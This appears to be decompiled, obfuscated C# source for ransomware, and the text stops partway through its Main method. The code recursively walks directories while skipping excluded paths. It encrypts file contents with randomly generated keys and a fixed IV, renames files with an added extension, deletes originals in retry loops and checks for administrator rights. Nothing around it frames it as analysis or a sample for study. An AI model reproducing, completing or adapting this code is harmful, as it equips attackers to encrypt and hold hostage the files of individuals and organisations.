using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using KpMfljJgmqhysH;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using wFdpgJCgVUnL;

namespace YBTDaqZXTw;

internal sealed class fdvkylEGapkbT
{
	public sealed class QUDWPNEYUv
	{
		private static StringCollection CwpdyLmLkMl;

		private static List<string> rDZLtJEcdgfnBbYsHN;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407180));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107391636)) && !text.ToLower().Contains(getString_0(107407207)) && !text.ToLower().Contains(getString_0(107391602)) && !text.ToLower().Contains(getString_0(107391621)) && !text.ToLower().Contains(getString_0(107407194)) && !text.ToLower().Contains(getString_0(107392055)) && !text.ToLower().Contains(getString_0(107391939)) && !text.ToLower().Contains(getString_0(107391890)) && !text.ToLower().Contains(getString_0(107391905)) && !text.ToLower().Contains(getString_0(107391856)) && !text.ToLower().Contains(getString_0(107391310)) && !text.ToLower().Contains(getString_0(107391325)) && !text.ToLower().Contains(getString_0(107391276)) && !text.ToLower().Contains(getString_0(107391295)) && !text.ToLower().Contains(getString_0(107391242)) && !text.ToLower().Contains(getString_0(107391261)) && !text.ToLower().Contains(getString_0(107391216)) && !text.ToLower().Contains(getString_0(107391231)) && !text.ToLower().Contains(getString_0(107391182)) && !text.Contains(UMsFeqgmECpmMQw(getString_0(107391197))) && !text.Contains(getString_0(107391172)) && !text.Contains(getString_0(107391127)) && !text.EndsWith(getString_0(107395276)) && !text.EndsWith(getString_0(107391130)) && !text.EndsWith(getString_0(107391093)) && !text.EndsWith(getString_0(107391088)) && !text.EndsWith(getString_0(107391083)) && !text.ToLower().Contains(getString_0(107391110)) && !text.ToLower().Contains(vRtRaLVWxUWQ))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(fKoTDIHCrS) * 1024.0 * 1024.0 && YTHZdrAysCSCqJCP == getString_0(107396771))
							{
								rDZLtJEcdgfnBbYsHN.Add(text);
							}
							else if (File.Exists(text) && YTHZdrAysCSCqJCP == getString_0(107396228))
							{
								rDZLtJEcdgfnBbYsHN.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return rDZLtJEcdgfnBbYsHN;
		}

		static QUDWPNEYUv()
		{
			Strings.CreateGetStringDelegate(typeof(QUDWPNEYUv));
			CwpdyLmLkMl = new StringCollection();
			rDZLtJEcdgfnBbYsHN = new List<string>();
		}
	}

	private sealed class quzMmQbNAakkAa
	{
		public string WZWHWeSBXzu;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == WZWHWeSBXzu;
		}
	}

	private sealed class cbCGHgGAwROs
	{
		public string zSOeZtQNCBsZV;

		public bool _003CIsDriveNTFS_003Eb__1b(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == zSOeZtQNCBsZV;
		}
	}

	private sealed class hslKqmAALJBlfcK
	{
		private sealed class ljwynMyzEvwgD
		{
			public hslKqmAALJBlfcK fdWkrHZwlDUdv;

			public string xBRwKYQOjQp;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CCrypt_003Eb__22()
			{
				try
				{
					if (CqkoqGibgFXpfa == getString_0(107396781) && xBRwKYQOjQp.EndsWith(getString_0(107407155)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107407182)), xBRwKYQOjQp.Replace(getString_0(107407155), getString_0(107407125)) + UMsFeqgmECpmMQw(getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == getString_0(107396781) && !xBRwKYQOjQp.EndsWith(getString_0(107407155)) && xBRwKYQOjQp.EndsWith(getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107407182)), xBRwKYQOjQp + getString_0(107407071) + UMsFeqgmECpmMQw(getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == getString_0(107396781) && !xBRwKYQOjQp.EndsWith(getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107407182)), xBRwKYQOjQp + getString_0(107407066) + UMsFeqgmECpmMQw(getString_0(107407152)));
					}
				}
				catch
				{
				}
			}

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					HjhRarxRXLl(WindowsIdentity.GetCurrent().Name, xBRwKYQOjQp);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				swpHKLKUtiU(xBRwKYQOjQp, fdWkrHZwlDUdv.CYhMazIAaeOTM, fdWkrHZwlDUdv.TuyIOFIBHopjl, fdWkrHZwlDUdv.ionjNPkCCEVsfJ, fdWkrHZwlDUdv.weIWMSlCLCiXZYm);
			}

			static ljwynMyzEvwgD()
			{
				Strings.CreateGetStringDelegate(typeof(ljwynMyzEvwgD));
			}
		}

		public string[] CYhMazIAaeOTM;

		public string[] ionjNPkCCEVsfJ;

		public string weIWMSlCLCiXZYm;

		public string TuyIOFIBHopjl;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__21(string string_0)
		{
			ljwynMyzEvwgD CS_0024_003C_003E8__locals0 = new ljwynMyzEvwgD();
			CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv = this;
			CS_0024_003C_003E8__locals0.xBRwKYQOjQp = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					if (CqkoqGibgFXpfa == ljwynMyzEvwgD.getString_0(107396781) && CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(ljwynMyzEvwgD.getString_0(107407155)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp.Replace(ljwynMyzEvwgD.getString_0(107407155), ljwynMyzEvwgD.getString_0(107407125)) + UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == ljwynMyzEvwgD.getString_0(107396781) && !CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(ljwynMyzEvwgD.getString_0(107407155)) && CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(ljwynMyzEvwgD.getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp + ljwynMyzEvwgD.getString_0(107407071) + UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == ljwynMyzEvwgD.getString_0(107396781) && !CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(ljwynMyzEvwgD.getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp + ljwynMyzEvwgD.getString_0(107407066) + UMsFeqgmECpmMQw(ljwynMyzEvwgD.getString_0(107407152)));
					}
				}
				catch
				{
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (wKqYuDCVvYLd && !QwrjqVpAtpM().Contains(getString_0(107390350)))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						HjhRarxRXLl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xBRwKYQOjQp);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (kPvytyWmXkPBKlYej == getString_0(107396778))
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					swpHKLKUtiU(CS_0024_003C_003E8__locals0.xBRwKYQOjQp, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.CYhMazIAaeOTM, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.TuyIOFIBHopjl, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.ionjNPkCCEVsfJ, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.weIWMSlCLCiXZYm);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				swpHKLKUtiU(CS_0024_003C_003E8__locals0.xBRwKYQOjQp, CYhMazIAaeOTM, TuyIOFIBHopjl, ionjNPkCCEVsfJ, weIWMSlCLCiXZYm);
			}
		}

		static hslKqmAALJBlfcK()
		{
			Strings.CreateGetStringDelegate(typeof(hslKqmAALJBlfcK));
		}
	}

	private sealed class unSYKVUbmHblH
	{
		public List<string> BUMYlfmNBJHo;

		public List<string> BCVMqJLrqel;

		public string lRlLhwhTyPu;

		public string[] tFHuYftOgGEqEKMA;

		public string mHfWrQyDyHEP;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			foreach (string item in BCVMqJLrqel)
			{
				if (item.ToLower().Contains(getString_0(107391652)) || item.ToLower().Contains(getString_0(107391663)) || item.ToLower().Contains(getString_0(107391618)) || item.ToLower().Contains(getString_0(107391637)) || item.ToLower().Contains(getString_0(107392092)) || item.ToLower().Contains(getString_0(107392071)) || item.ToLower().Contains(getString_0(107392058)) || item.ToLower().Contains(getString_0(107392077)) || item.ToLower().Contains(getString_0(107392040)) || item.ToLower().Contains(getString_0(107391999)) || item.ToLower().Contains(getString_0(107392014)) || item.ToLower().Contains(getString_0(107391969)) || item.ToLower().Contains(getString_0(107391980)) || item.Contains(getString_0(107391955)) || item.Contains(getString_0(107391906)) || item.Contains(getString_0(107391921)) || item.Contains(getString_0(107391872)) || item.Contains(getString_0(107391887)) || item.Contains(getString_0(107391326)) || item.Contains(getString_0(107391341)) || item.Contains(getString_0(107391292)) || item.Contains(getString_0(107391311)) || item.Contains(getString_0(107391258)) || item.ToLower().Contains(getString_0(107391277)) || item.ToLower().Contains(getString_0(107391232)) || item.ToLower().Contains(getString_0(107391247)) || item.ToLower().Contains(getString_0(107391198)) || item.Contains(UMsFeqgmECpmMQw(getString_0(107391213))) || item.Contains(getString_0(107391188)) || item.Contains(getString_0(107391143)) || item.EndsWith(getString_0(107407067)) || item.EndsWith(getString_0(107391146)) || item.EndsWith(getString_0(107391109)) || item.EndsWith(getString_0(107391104)) || item.EndsWith(getString_0(107391099)) || item.Contains(getString_0(107391126)) || item.Contains(vRtRaLVWxUWQ) || item.Contains(XTpFtiqHigTwzn) || item.Contains(oVFLPykEyliA))
				{
					continue;
				}
				if (tFHuYftOgGEqEKMA.Length != 0)
				{
					string[] array = tFHuYftOgGEqEKMA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09c1;
					}
				}
				if (!item.EndsWith(string_0) || yPXLGtMRJTLFe.Contains(item))
				{
					continue;
				}
				if (PvdtfERdGevF == getString_0(107396787))
				{
					try
					{
						if (ickXCsmotx.pFtHqxtrIwxvy(item))
						{
							ickXCsmotx.nkIKigGZKzcDmh(item);
						}
					}
					catch
					{
					}
				}
				yPXLGtMRJTLFe.Add(item);
				if (!NnXnVroauy.Contains(Path.GetDirectoryName(item)))
				{
					NnXnVroauy.Add(Path.GetDirectoryName(item));
				}
				AXKQsmCJUmCYzKL(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex)
					{
						if (TfpcYTfYwiZ)
						{
							try
							{
								File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390461) + item + getString_0(107407086) + ex.Message + getString_0(107396608));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0505;
					}
					if (KFmKhFFHYbFap == getString_0(107396787) && new FileInfo(item).Length > Convert.ToInt32(FSmYeUMoln) * 1024 * 1024 && !BUMYlfmNBJHo.Contains(string_0))
					{
						try
						{
							if (lRlLhwhTyPu != getString_0(107389697))
							{
								File.Move(item, item + lRlLhwhTyPu);
							}
						}
						catch (Exception ex3)
						{
							if (TfpcYTfYwiZ)
							{
								try
								{
									File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390461) + item + getString_0(107407025) + ex3.Message + getString_0(107396608));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						string text = item + lRlLhwhTyPu;
						if (YeRjXesflK == getString_0(107396787))
						{
							foreach (string item2 in tdGoFrmZRSDgex)
							{
								if (text.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == getString_0(107396787))
								{
									if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > new FileInfo(text).Length)
									{
										try
										{
											ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392500), getString_0(107392495), getString_0(107392450), text);
										}
										catch
										{
										}
									}
								}
								else if (text.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == getString_0(107396244))
								{
									try
									{
										ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392500), getString_0(107392495), getString_0(107392450), text);
									}
									catch
									{
									}
								}
							}
						}
						string text2 = RhHGGkxKaJlh.PesTFjBOVNb(32);
						string s = vMIKiIwtveyB.GfpVZvWzMIElkKF(text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ifyYfKFnqSzZyvn == getString_0(107396244))
						{
							byte[] array2 = null;
							byte[] byte_ = mYdJdJnIkYOjBSNk.SWdoFjhxOTmB(text, Convert.ToInt32(FSmYeUMoln) * 1024 * 1024);
							array2 = ((!KzojBHDhTMmk) ? (dKfSpybLYvFvyKv ? mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dKfSpybLYvFvyKv ? YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
							mYdJdJnIkYOjBSNk.MXdhDIMXmDxxv(text, array2, bytes);
						}
						else if (!dKfSpybLYvFvyKv)
						{
							JyNvffrllaXO.cwEdRCAtuf(text, FSmYeUMoln, mHfWrQyDyHEP);
						}
						else
						{
							JyNvffrllaXO.cwEdRCAtuf(text, FSmYeUMoln, text2, bytes);
						}
					}
					else
					{
						if (lRlLhwhTyPu != getString_0(107389697))
						{
							VuDswLdYmspn(item, item + lRlLhwhTyPu, UCLDIbRwOFSI);
						}
						else
						{
							VuDswLdYmspn(item, item + getString_0(107389692), UCLDIbRwOFSI);
						}
						if (dKfSpybLYvFvyKv)
						{
							LvqQiyYFTFKfLYz(item + lRlLhwhTyPu, Encoding.ASCII.GetBytes(oUoqPtPNHwCatJ));
						}
					}
					goto IL_09c1;
					end_IL_0505:;
				}
				catch (Exception)
				{
					goto IL_09c1;
				}
				continue;
				IL_09c1:
				BCVMqJLrqel.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2e(string string_0)
		{
			if (!string_0.ToLower().Contains(getString_0(107391652)) && !string_0.ToLower().Contains(getString_0(107391663)) && !string_0.ToLower().Contains(getString_0(107391618)) && !string_0.ToLower().Contains(getString_0(107391637)) && !string_0.ToLower().Contains(getString_0(107392092)) && !string_0.ToLower().Contains(getString_0(107392071)) && !string_0.ToLower().Contains(getString_0(107392058)) && !string_0.ToLower().Contains(getString_0(107392077)) && !string_0.ToLower().Contains(getString_0(107392040)) && !string_0.ToLower().Contains(getString_0(107391999)) && !string_0.ToLower().Contains(getString_0(107392014)) && !string_0.ToLower().Contains(getString_0(107391969)) && !string_0.ToLower().Contains(getString_0(107391980)) && !string_0.Contains(getString_0(107391955)) && !string_0.Contains(getString_0(107391906)) && !string_0.Contains(getString_0(107391921)) && !string_0.Contains(getString_0(107391872)) && !string_0.Contains(getString_0(107391887)) && !string_0.Contains(getString_0(107391326)) && !string_0.Contains(getString_0(107391341)) && !string_0.Contains(getString_0(107391292)) && !string_0.Contains(getString_0(107391311)) && !string_0.Contains(getString_0(107391258)) && !string_0.ToLower().Contains(getString_0(107391277)) && !string_0.ToLower().Contains(getString_0(107391232)) && !string_0.ToLower().Contains(getString_0(107391247)) && !string_0.ToLower().Contains(getString_0(107391198)) && !string_0.Contains(UMsFeqgmECpmMQw(getString_0(107391213))) && !string_0.Contains(getString_0(107391188)) && !string_0.Contains(getString_0(107391143)) && !string_0.EndsWith(getString_0(107407067)) && !string_0.EndsWith(getString_0(107391146)) && !string_0.EndsWith(getString_0(107391109)) && !string_0.EndsWith(getString_0(107391104)) && !string_0.EndsWith(getString_0(107391099)) && !string_0.Contains(getString_0(107391126)) && !string_0.Contains(vRtRaLVWxUWQ) && !string_0.Contains(XTpFtiqHigTwzn) && !string_0.Contains(oVFLPykEyliA))
			{
				if (tFHuYftOgGEqEKMA.Length != 0)
				{
					string[] array = tFHuYftOgGEqEKMA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!string_0.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_097d;
					}
				}
				if (!yPXLGtMRJTLFe.Contains(string_0))
				{
					if (PvdtfERdGevF == getString_0(107396787))
					{
						try
						{
							if (ickXCsmotx.pFtHqxtrIwxvy(string_0))
							{
								ickXCsmotx.nkIKigGZKzcDmh(string_0);
							}
						}
						catch
						{
						}
					}
					yPXLGtMRJTLFe.Add(string_0);
					if (!NnXnVroauy.Contains(Path.GetDirectoryName(string_0)))
					{
						NnXnVroauy.Add(Path.GetDirectoryName(string_0));
					}
					AXKQsmCJUmCYzKL(string_0);
					try
					{
						try
						{
							if (new FileInfo(string_0).Length != 0L)
							{
								goto end_IL_04de;
							}
							goto end_IL_04de_2;
							end_IL_04de:;
						}
						catch (Exception ex)
						{
							if (TfpcYTfYwiZ)
							{
								try
								{
									File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390461) + string_0 + getString_0(107407086) + ex.Message + getString_0(107396608));
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_04de_2;
						}
						if (KFmKhFFHYbFap == getString_0(107396787) && new FileInfo(string_0).Length > Convert.ToInt32(FSmYeUMoln) * 1024 * 1024)
						{
							try
							{
								if (lRlLhwhTyPu != getString_0(107389697))
								{
									File.Move(string_0, string_0 + lRlLhwhTyPu);
								}
							}
							catch (Exception ex3)
							{
								if (TfpcYTfYwiZ)
								{
									try
									{
										File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390461) + string_0 + getString_0(107407025) + ex3.Message + getString_0(107396608));
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							string_0 += lRlLhwhTyPu;
							if (YeRjXesflK == getString_0(107396787))
							{
								foreach (string item in tdGoFrmZRSDgex)
								{
									if (string_0.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396787))
									{
										if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > new FileInfo(string_0).Length)
										{
											try
											{
												ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392500), getString_0(107392495), getString_0(107392450), string_0);
											}
											catch
											{
											}
										}
									}
									else if (string_0.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396244))
									{
										try
										{
											ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392500), getString_0(107392495), getString_0(107392450), string_0);
										}
										catch
										{
										}
									}
								}
							}
							string text = RhHGGkxKaJlh.PesTFjBOVNb(32);
							string s = vMIKiIwtveyB.GfpVZvWzMIElkKF(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (ifyYfKFnqSzZyvn == getString_0(107396244))
							{
								byte[] array2 = null;
								byte[] byte_ = mYdJdJnIkYOjBSNk.SWdoFjhxOTmB(string_0, Convert.ToInt32(FSmYeUMoln) * 1024 * 1024);
								array2 = ((!KzojBHDhTMmk) ? (dKfSpybLYvFvyKv ? mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dKfSpybLYvFvyKv ? YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
								mYdJdJnIkYOjBSNk.MXdhDIMXmDxxv(string_0, array2, bytes);
							}
							else if (!dKfSpybLYvFvyKv)
							{
								JyNvffrllaXO.cwEdRCAtuf(string_0, FSmYeUMoln, mHfWrQyDyHEP);
							}
							else
							{
								JyNvffrllaXO.cwEdRCAtuf(string_0, FSmYeUMoln, text, bytes);
							}
						}
						else
						{
							if (lRlLhwhTyPu != getString_0(107389697))
							{
								VuDswLdYmspn(string_0, string_0 + lRlLhwhTyPu, UCLDIbRwOFSI);
							}
							else
							{
								VuDswLdYmspn(string_0, string_0 + getString_0(107389692), UCLDIbRwOFSI);
							}
							if (dKfSpybLYvFvyKv)
							{
								LvqQiyYFTFKfLYz(string_0 + lRlLhwhTyPu, Encoding.ASCII.GetBytes(oUoqPtPNHwCatJ));
							}
						}
						end_IL_04de_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_097d;
			IL_097d:
			BCVMqJLrqel.Remove(string_0);
		}

		static unSYKVUbmHblH()
		{
			Strings.CreateGetStringDelegate(typeof(unSYKVUbmHblH));
		}
	}

	private sealed class bBZqHdCrBaerAZ
	{
		public string vYqAcfieYkUdqlaV;

		public string kZerlxSVnfjP;

		public void _003CEncrypt2_003Eb__35()
		{
			while (true)
			{
				try
				{
					File.Delete(vYqAcfieYkUdqlaV);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__36()
		{
			while (true)
			{
				try
				{
					if (File.Exists(kZerlxSVnfjP))
					{
						File.Delete(kZerlxSVnfjP);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string HUFUXAJeqIWSXcOELF;

	public static byte[] UCLDIbRwOFSI;

	public static string YTHZdrAysCSCqJCP;

	public static string fKoTDIHCrS;

	public static List<string> thizDxJzbdFr;

	public static List<string> sCKBxESJMpvVXp;

	public static string GDCYhuWfDwyNq;

	public static string mHfWrQyDyHEP;

	public static string oUoqPtPNHwCatJ;

	public static string APjcYBpyaaCnVsgh;

	public static int dhLFyhDQAcxBwkEP;

	public static string PvdtfERdGevF;

	public static string zqwWpGhEpOpQ;

	public static string FUbpLpWkniIyR;

	public static string yGIDvMHITfCct;

	public static string mViNJNiByIZ;

	public static string WhzpJhMGWQlH;

	public static string BhvDdMThqgWvU;

	public static string zPkDxLdFtqsabg;

	public static List<string> NTmjnOoDFhsRo;

	public static List<string> NnXnVroauy;

	public static string bANDxossLvmXg;

	public static string wvrLujKHhRyU;

	public static string OKhadXAVJsKMfGp;

	public static List<string> yPXLGtMRJTLFe;

	public static string xsOPJPlgcqHwrV;

	private static string xlZuURyEYkVM;

	public static string kPvytyWmXkPBKlYej;

	public static string GhkKkHGcETIsMQh;

	public static List<string> qVSYqPqzFDgvw;

	public static List<string> aVSgOyvOKixiOZhem;

	public static List<string> zXIdDQEuVwYo;

	public static List<string> tmHaEWqnXudg;

	public static string ubHXHkwsTjIxkt;

	public static List<string> CygYQxkVcvLjEa;

	public static List<string> ZJnGvhEgMPvKo;

	public static string nFbLIGlZufY;

	public static string RQnfPUyabvkbjBQM;

	internal static DateTime ytdAcOLjjYclpCEH;

	internal static DateTime ZnXhduYGGrm;

	public static string KFmKhFFHYbFap;

	public static string FSmYeUMoln;

	public static string MnwIXccgUusgmGvAy;

	public static string ADqeVnjfTXdQR;

	public static string omdhjJpTFXA;

	public static string ysWDZXyQAhJsziRY;

	public static string CkXxFahCHvdk;

	public static string YeRjXesflK;

	public static List<string> tdGoFrmZRSDgex;

	public static string ZmtAmSRTqWRL;

	public static string PXbtmkwFEcS;

	public static string PeLXcMKcTo;

	public static string fNFwbvvmkpHs;

	public static string VuJRMnRTldZYI;

	public static string NbphLPFvGkuDBm;

	public static string DxVYyifBkANCm;

	public static string FzbjSrgZSQZGnPC;

	public static string rsErtYlITiucN;

	public static string DmasaMBmVEkl;

	public static string FNsZBepHglFQTs;

	public static string vhhjVkqlJLg;

	public static string qAYmmQxaNZn;

	public static string DoGzWEXZVfOnAZf;

	public static string CqkoqGibgFXpfa;

	public static string KcOjUgDSQtgGnAaT;

	public static string EULsvRoNCvsdCJWVe;

	public static string tEKuBqPjBuOCshFU;

	public static string BxydwWlazJYo;

	public static string vRtRaLVWxUWQ;

	public static string xJmSgvErkcgu;

	public static string aWROomwhSppOv;

	public static string yyUmWvysfpc;

	public static string RVLdkLAFsbNV;

	public static string NcfjRizCakajSGl;

	public static string LJXMmTWpXnaK;

	public static string ifyYfKFnqSzZyvn;

	public static string qcCGpHkhmED;

	public static string twaCZwLhmnIEaDXX;

	public static string[] pxwofrQHvBYQmc;

	public static string JhBqPOdPslDLd;

	public static bool KzojBHDhTMmk;

	public static string esygzjBYVPopS;

	public static bool dKfSpybLYvFvyKv;

	public static bool UPGpacLZCdbULgY;

	public static bool OhwnJVvNAck;

	public static bool kaofbiRznaot;

	public static string XTpFtiqHigTwzn;

	public static bool TfpcYTfYwiZ;

	public static bool HNLhXSuHwLaCCy;

	public static bool kZHyFbeFNlI;

	public static bool wKqYuDCVvYLd;

	public static string oVFLPykEyliA;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			quzMmQbNAakkAa CS_0024_003C_003E8__locals0 = new quzMmQbNAakkAa();
			CS_0024_003C_003E8__locals0.WZWHWeSBXzu = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.WZWHWeSBXzu) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			XgfRKnqXcPrQK.uDQbwYBAtKR(xlZuURyEYkVM);
		}
		catch (Exception)
		{
		}
		try
		{
			if (LJXMmTWpXnaK == getString_0(107396768))
			{
				Thread thread = new Thread(lhVwafCtGJ.ZGsSmrombc);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (FUbpLpWkniIyR == getString_0(107396768))
		{
			Thread.Sleep(int.Parse(yGIDvMHITfCct));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CkXxFahCHvdk == getString_0(107396768))
		{
			try
			{
				EUkhrFVIlAr(UMsFeqgmECpmMQw(getString_0(107396763)));
			}
			catch
			{
			}
		}
		try
		{
			if (BhvDdMThqgWvU == getString_0(107396768) && LBrlujwbxTwQyaCs.vvibPFpaRPpl())
			{
				new oJrrVZYkhGaliAU().ZfkDxzdwQaubKe(bool_0: false);
				LBrlujwbxTwQyaCs.dFchssvnuUwnDA();
			}
		}
		catch (Exception)
		{
		}
		if (wvrLujKHhRyU == getString_0(107396768) && LBrlujwbxTwQyaCs.vvibPFpaRPpl())
		{
			new oJrrVZYkhGaliAU().ZfkDxzdwQaubKe(bool_0: false);
			new oJrrVZYkhGaliAU().oIgDcthkpQuZnf();
		}
		if (zqwWpGhEpOpQ == getString_0(107396768))
		{
			SfKhTYaxOacb.RsIVYHRyghs();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
